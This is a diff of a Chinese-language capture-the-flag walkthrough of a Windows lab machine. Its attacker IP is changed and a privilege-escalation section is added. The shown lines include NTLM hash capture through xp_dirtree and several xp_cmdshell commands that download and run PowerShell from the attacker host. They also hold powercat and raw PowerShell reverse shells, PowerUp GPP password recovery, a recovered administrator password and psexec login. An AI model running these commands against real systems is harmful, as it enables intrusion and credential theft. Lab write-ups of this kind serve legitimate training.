@@ -4,7 +4,7 @@
 
 > victim: 10.10.10.125
 >
-> local: 10.10.14.4
+> local: 10.10.14.10
 
 ## SMB
 
@@ -84,8 +84,8 @@ sudo responder -I tun0
 在受害机器上执行下方两句之一
 
 ```mssql
-exec xp_dirtree '\\10.10.14.4\share\file'
-exec xp_fileexist '\\10.10.14.4\share\file'
+exec xp_dirtree '\\10.10.14.10\share\file'
+exec xp_fileexist '\\10.10.14.10\share\file'
 ```
 
 捕获到信息，保存至`res/NTLMv2.md`
@@ -132,7 +132,7 @@ sudo python3 -m http.server
 目标上执行命令
 
 ```mssql
-xp_cmdshell powershell iex(New-Object System.Net.Webclient).DownloadString(\"http://10.10.14.4:8000/reverse.ps1\")
+xp_cmdshell powershell iex(New-Object System.Net.Webclient).DownloadString(\"http://10.10.14.10:8000/reverse.ps1\")
 ```
 
 被AV杀了.....阿这
@@ -142,7 +142,7 @@ xp_cmdshell powershell iex(New-Object System.Net.Webclient).DownloadString(\"htt
 本机生成独立payload并base64编码
 
 ```powershell
-powercat -c 10.10.14.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
+powercat -c 10.10.14.10 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
 ```
 
 ```mssql
@@ -152,7 +152,7 @@ powershell -E <代码见res/systeminfo.md>
 代码太长，无法执行，先当作文件传过去
 
 ```mssql
-xp_cmdshell certutil -f -urlcache http://10.10.14.4:8000/encodedreverseshell.ps1 a.bat
+xp_cmdshell certutil -f -urlcache http://10.10.14.10:8000/encodedreverseshell.ps1 a.bat
 ```
 
 执行失败，certutil没法用
@@ -162,7 +162,7 @@ xp_cmdshell certutil -f -urlcache http://10.10.14.4:8000/encodedreverseshell.ps1
 目标上执行命令
 
 ```mssql
-xp_cmdshell powershell -c \"$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.4'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);    $sendback =(iex $data 2>&1 | Out-String );    $sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);   $stream.Write($sendbyte,0,$sendbyte.Length);    $stream.Flush();}\"
+xp_cmdshell powershell -c \"$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.10'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);    $sendback =(iex $data 2>&1 | Out-String );    $sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);   $stream.Write($sendbyte,0,$sendbyte.Length);    $stream.Flush();}\"
 ```
 
 木有反应，转义字符太多，太难顶，不折腾了
@@ -170,7 +170,7 @@ xp_cmdshell powershell -c \"$client = New-Object System.Net.Sockets.TCPClient(''
 ### 利用powercat直接payload——成功
 
 ```bash
-xp_cmdshell powershell -noprofile IEX(New-Object System.Net.Webclient).DownloadString(\"http://10.10.14.4:8000/powercat.ps1\");powercat -c 10.10.14.4 -p 443 -e powershell
+xp_cmdshell powershell -noprofile IEX(New-Object System.Net.Webclient).DownloadString(\"http://10.10.14.10:8000/powercat.ps1\");powercat -c 10.10.14.10 -p 443 -e powershell
 ```
 
 成功了，Powercat，永远的神
@@ -181,5 +181,55 @@ xp_cmdshell powershell -noprofile IEX(New-Object System.Net.Webclient).DownloadS
 c37b41bb669da345bb14de50faab3c16
 ```
 
-## 提权
+## PRIVILEGE ESCALATION
 
+```bash
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1
+echo Invoke-AllChecks >> PowerUp.ps1
+```
+
+on victim
+
+```powershell
+iex(new-object net.webclient).downloadstring( "http://10.10.14.10:8000/PowerUp.ps1")
+```
+
+结果见`PowerUp.md`
+
+GPP文件泄漏，属于GPP漏洞，一般只在2008没打漏洞的版本上存在
+
+> 参考文章：https://xz.aliyun.com/t/7784
+>
+> 相关介绍：
+>
+> If sysadmins attempt to mitigate the GPP vulnerability by deleting the associated GPO, the
+> cached groups.xml files will remain on the end points. However, if the GPO containing the GPP
+> setting is unlinked from the GPO, the cached groups.xml files will be removed.
+>
+> GPO：组策略
+>
+> GPP：组策略选项
+
+得到Administrator的新密码
+
+```
+MyUnclesAreMarioAndLuigi!!1!
+```
+
+获取系统级Shell
+
+```bash
+python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
+```
+
+得到root
+
+```
+b19c3794f786a1fdcf205f81497c3592
+```
+
+相比`psexec`，`wmiexec`隐蔽性更高，更推荐后者，两者适用环境也相似
+
+`wmiexec`既可以通过账号密码登陆，也可以通过hash
+
+都主要依赖445端口
